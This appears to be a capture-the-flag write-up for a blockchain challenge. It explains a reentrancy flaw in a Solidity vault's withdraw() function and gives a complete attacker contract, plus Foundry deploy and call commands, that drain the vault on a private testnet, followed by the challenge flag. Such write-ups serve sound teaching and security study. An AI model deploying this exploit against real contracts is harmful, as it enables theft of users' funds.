# DrainMe_MU (Security Impossible CTF 2026 - Monash University, blockchain)

DrainMe presents an Ethereum smart contract challenge hosted on a private Anvil testnet (chain ID 31337). The challenge launcher provides an RPC endpoint, a funded player private key, and the deployed address of a vulnerable `Vault` contract. The vault starts with an initial balance of 5 ETH. The challenge reports solved when the vault contract's balance is drained completely to zero.

## Decompilation and Vulnerability Analysis

Querying the contract bytecode and decompiling the runtime functions highlights two external methods: `deposit()` and `withdraw()`.

Inspecting `withdraw()` (function selector `0x3ccfd60b`):

```solidity
function withdraw() external {
    uint256 bal = balances[msg.sender];
    require(bal > 0, "No balance");
    (bool success, ) = msg.sender.call{value: bal}("");
    require(success, "Transfer failed");
    balances[msg.sender] = 0;
}
```

This is the classic Checks-Effects-Interactions anti-pattern. The contract reads the user balance, verifies it is greater than zero, and immediately sends the funds via a low-level call (`msg.sender.call{value: bal}("")`). Only after the external call finishes does the contract update internal storage by setting `balances[msg.sender] = 0`.

When an external contract receives ETH via a low-level call, execution passes to the recipient contract's `receive()` or `fallback()` function. Because the victim contract's storage variable `balances[msg.sender]` has not yet been cleared, calling `withdraw()` again inside the fallback function passes the `require(bal > 0)` check a second time.

## Crafting the Reentrancy Attack

To satisfy the challenge condition `address(vault).balance == 0`, we need the vault balance to hit zero without leaving any remaining wei.

Because the vault starts with 5 ETH, we deposit 5 ETH from our attacking contract. The vault balance increases to 10 ETH, and our recorded balance is 5 ETH.

When our attacking contract initiates `withdraw()`, the vault sends 5 ETH to our contract. Our `receive()` function catches the payment and checks if the vault still holds at least 5 ETH. Finding 5 ETH remaining, it calls `withdraw()` a second time. The second call sends the remaining 5 ETH. Finally, both execution frames unwind and reset the user balance to zero.

Here is the exploit contract:

```solidity
pragma solidity ^0.8.0;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVault public vault;
    uint256 public amount;

    constructor(address _vault) {
        vault = IVault(_vault);
    }

    function attack() external payable {
        amount = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= amount) {
            vault.withdraw();
        }
    }
}
```

## Deployment and Execution

Using Foundry (`forge` and `cast`), we compile and deploy `Attacker.sol` pointing to the vault address, then invoke `attack()` with 5 ETH:

```bash
forge create src/Attacker.sol:Attacker --rpc-url $RPC --private-key $PK --broadcast --constructor-args $VAULT
cast send $ATTACKER "attack()" --value 5ether --rpc-url $RPC --private-key $PK
```

Both 5 ETH payouts execute cleanly. The vault balance drops to zero, and querying the launcher at `/flag` returns the flag.

Solve: `solve/solve.sh`

Flag: `sictf{aed1025cd1bf02917bb99f2355b1e06f}`
